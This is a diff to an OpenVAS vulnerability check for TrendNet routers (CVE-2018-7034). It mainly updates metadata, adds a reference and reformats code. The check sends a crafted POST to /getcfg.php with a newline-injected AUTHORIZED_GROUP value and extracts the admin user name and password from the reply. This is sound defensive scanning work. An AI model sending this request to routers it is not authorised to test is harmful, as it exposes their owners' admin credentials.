@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_trendnet_routers_info_disc.nasl 8853 2018-02-16 15:44:13Z emoss $
+# $Id: gb_trendnet_routers_info_disc.nasl 9014 2018-03-02 14:23:06Z cfischer $
 #
 # TrendNet Routers AUTHORIZED_GROUP Information Disclosure Vulnerability
 #
@@ -28,11 +28,12 @@
 if (description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.107299");
-  script_version("$Revision: 8853 $");
-  script_tag(name:"last_modification", value:"$Date: 2018-02-16 16:44:13 +0100 (Fri, 16 Feb 2018) $");
-  script_tag(name: "creation_date", value: "2018-02-15 19:23:07 +0100 (Thu, 15 Feb 2018)");
+  script_version("$Revision: 9014 $");
+  script_tag(name:"last_modification", value:"$Date: 2018-03-02 15:23:06 +0100 (Fri, 02 Mar 2018) $");
+  script_tag(name:"creation_date", value:"2018-02-15 19:23:07 +0100 (Thu, 15 Feb 2018)");
   script_tag(name:"cvss_base", value:"7.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
+  script_cve_id("CVE-2018-7034");
 
   script_tag(name: "qod_type", value: "remote_active");
 
@@ -46,14 +47,20 @@ if (description)
   script_family("Web application abuses");
   script_dependencies("gb_trendnet_router_detect.nasl");
   script_require_ports("Services/www", 8080);
-  script_exclude_keys("Settings/disable_cgi_scanning");
   script_mandatory_keys("trendnet/detected");
+
+  script_xref(name: "URL", value: "http://seclists.org/fulldisclosure/2018/Feb/42");
 
   script_tag(name: "summary", value: "TrendNet routers are vulnerable to information disclosure attacks");
 
-  script_tag(name: "impact", value: "An attacker can use this global variable to bypass security checks and use it to read arbitrary files.");
-  script_tag(name: "insight", value: "The vulnerability is due to the global variable AUTHORIZED_GROUP which can be triggered when the admin login");
-  script_tag(name: "solution", value: "No solution or patch is available as of 15th February, 2018. Information regarding this issue will be updated once the solution details are available.");
+  script_tag(name: "impact", value: "An attacker can use this global variable to bypass security checks
+  and use it to read arbitrary files.");
+
+  script_tag(name: "insight", value: "The vulnerability is due to the global variable AUTHORIZED_GROUP
+  which can be triggered when the admin login");
+
+  script_tag(name: "solution", value: "No solution or patch is available as of 15th February, 2018.
+  Information regarding this issue will be updated once the solution details are available.");
 
   script_tag(name: "vuldetect", value: "Send a crafted request to the router and check the response.");
 
@@ -73,18 +80,14 @@ url  ='/getcfg.php';
 data = 'SERVICES=DEVICE.ACCOUNT%0aAUTHORIZED_GROUP=1';
 req = http_post_req(port: port, url: url, data: data,
                     add_headers: make_array("Content-Type", "application/x-www-form-urlencoded"));
-
 res = http_keepalive_send_recv(port: port, data: req, bodyonly: FALSE);
 
 if (res =~ "HTTP/1\.. 200" && "<service>DEVICE.ACCOUNT</service>" >< res) {
   username = eregmatch(pattern: "<name>(.*)</name>", string: res);
   passwd = eregmatch(pattern: "<password>(.*)</password>", string: res);
-  if (!isnull(username) && !isnull(passwd))
-  {
+  if (!isnull(username) && !isnull(passwd)) {
     report = "The following information could be disclosed:  user name is " + username[1] + " , password is " + passwd[1];
-  }
-  else 
-  {
+  } else  {
     report = "The following response contains disclosed information from the router \n";
     report += res;
   }
